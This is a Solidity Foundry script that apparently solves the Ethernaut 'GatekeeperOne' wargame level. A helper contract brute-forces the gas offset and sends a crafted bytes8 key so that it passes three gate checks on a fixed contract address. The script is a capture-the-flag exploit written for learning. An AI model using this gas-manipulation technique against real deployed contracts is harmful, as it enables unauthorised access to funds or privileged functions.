/*
Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:
Remember what you've learned from the Telephone and Token levels.
You can learn more about the special function gasleft(), 
in Solidity's documentation (see Units and Global Variables and External Function Calls).
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "src/GatekeeperOne.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract Gate {
    GatekeeperOne public gatekeeperOne;

    constructor(GatekeeperOne _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack() public {
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gatekeeperOne).call{gas: i + 150 + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", bytes8(0x0100000000006072))
            );
            if (result) {
                break;
            }
        }
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        // entrant = tx.origin;
        return true;
    }

    modifier gateOne() {
        require(msg.sender == tx.origin);
        _;
    }

    modifier gateTwo() {
        console.log("getTwo:Gas left:", gasleft());
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        // you shouldn't have to specify the first 4 bytes as full of zero.
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
}

contract GatekeeperOneSolution is Script {
    GatekeeperOne public gatekeeperOne = GatekeeperOne(0x3B7dFBa95d1eD3B729A3bD3e1E70a84Ed15FDe8f);
    //gateKey should be uint16(uint160(0x58AC4330c91A5d7fDba80Bc439D70Ef0CbDA6072)) = 24690

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("1. gasleft", gasleft());
        Gate gate = new Gate(gatekeeperOne);
        console.log("2. gasleft", gasleft());
        // gate.enter{gas: 8191000000}(bytes8(0x0100000000006072));
        gate.attack();
        console.log("3. gasleft", gasleft());
        // gate.attack();
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
